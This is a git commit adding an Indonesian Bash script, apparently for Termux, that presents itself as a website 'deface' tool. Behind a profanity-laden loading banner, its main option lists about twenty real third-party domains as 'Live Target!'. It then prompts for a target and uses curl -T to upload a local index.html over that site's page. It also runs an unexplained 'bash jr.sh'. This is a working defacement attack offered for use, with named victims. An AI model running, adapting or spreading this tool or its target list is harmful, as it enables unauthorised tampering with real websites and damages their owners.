0d97dcb3e19e014beac5f8ce10a53ba8d88c1b7d
RamaMED19 <67484406+RamaMED19@users.noreply.github.com>
2020-08-07 20:34:16 +0700

    Add files via upload

---
+++ Mirei7.sh
@@ -0,0 +1,243 @@
+#Gila_coding
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+pkg install toilet -y
+bash jr.sh
+echo
+echo  $green
+echo "Loading.............";
+sleep 0.1;
+clear
+echo  $green
+echo 'SABAR GOBLOK.........................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................';
+sleep 0.1;
+clear
+echo  $red
+echo 'SABAR GOBLOK............................................';
+sleep 0.4;
+echo  $green
+echo "SABAR GOBLOK..................................";
+sleep 0.1;
+clear
+echo  $green
+echo  'Harap Sabar...............';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading................................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar...........................';
+sleep 0.1;
+echo  $green
+echo "Loading.........................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar....................................................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading GOBLOK................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar GOBLOK............................................';
+sleep 0.1;
+echo  $green
+echo "Loading.....................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar GOBLOK.............................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading........................................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar GOBLOK........................';
+sleep 0.1;
+clear
+echo  $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'Harap Sabar................';
+sleep 0.1;
+clear
+echo  $green
+echo 'Loading.................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar ANJG...................................................';
+sleep 0.4;
+echo  $green
+echo "Loading....................................";
+sleep 0.1;
+clear
+echo  $green
+echo "Loading.............................................";
+sleep 0.1;
+clear
+echo  $green
+echo 'SABAR KONTOL................';
+sleep 0.1;
+clear
+echo  $green
+echo 'SABAR NGENTOD.................................';
+sleep 0.1;
+clear
+echo  $red
+echo 'Harap Sabar BANGSD...................................................';
+sleep 0.4;
+echo  $green
+echo "NAH BERES ANJG....................................";
+sleep 0.1;
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+toilet -f future "    @Ramaahmd_" | lolcat
+echo
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $yellow
+figlet -f future "Manusia Penuh Dosa Team"
+echo
+echo $red"##########################$green" Mirei07 "$red###########################"
+echo
+echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index"$cyan
+echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Maintance"$cyan
+echo 
+echo
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $indigo"  "$cyan""$white""$cyan""$purple""$green" "$indigo"      "$cyan""$white""$cyan""$green""$indigo"     "$cyan""$white""$cyan""$green""$cyan
+echo $cyan""
+echo $indigo
+echo
+echo $white "╭─"$yellow"Mirei07"$cyan" ~ICA"$white
+read -p " ╰─$ "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "Deface Tebas Index" | lolcat
+echo
+echo $red "Simpan SC Di Memory Internal Di Luar Folder "
+echo
+echo $purple "Live Target!"
+echo $yellow "Domain .com"
+echo $red "http://chasingfantasia.com" 
+echo $red "http://crimsonmonkeyweb.com" 
+echo $red "http://kevinbutho.com" 
+echo $red "http://prorepafrica.com" 
+echo $red "http://essentialtours.com" 
+echo $red "http://kobralocks.com" 
+echo $red "http://thepremiummakers.com" 
+echo $yellow "Domain co.za"
+echo $white "http://contsol.co.za"
+echo $white "http://colourfactory.co.za"
+echo $white "http://chillibitez.co.za" 
+echo $white "http://centraltech.co.za" 
+echo $white "http://cblandscapes.co.za" 
+echo $white "http://xposurephotography.co.za" 
+echo $white "ndporcupines.co.za" 
+echo $white "http://tcnig.co.za" 
+echo $white "http://techdirect.co.za" 
+echo $white "http://thehellenic.co.za" 
+echo $white "http://valdicare.co.za"
+echo $yellow "Bonus All Domain"
+echo $cyan "http://www.aquafitness.za.net" 
+echo $cyan "http://hellomobile.mobi" 
+echo $cyan "http://happy.mikikk.co.jp" 
+
+
+
+echo
+echo $red "Eksekusi Taarget!!!"
+echo $green "╭─"$blue"Mirei07"$cyan" ~MPDT"$white
+read -p " ╰─$ "  target
+echo
+echo $red "Masukan Script!!! "
+echo $green "╭─"$blue"Mirei07"$cyan" ~/Nama SC Harus(index.html)"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$yellow"TerSodomi"$red"]"$cyan"～～～＞"$green" $target"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+echo 
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "   Informasi Tools" | lolcat
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $green"Author  : Mirei07 		"
+echo $purple"INSTAGRAM   : @Ramaahmd_"
+echo $white"Blog    : http://blogspot-Deface.com"
+echo
+echo $yellow"                          
+echo
+
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+cat tutorial.txt
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " Terimakasih Sudah Menggunakan Tools Kami.. Follow Ig saya @Ramaahmd_ "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh Mirei7.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
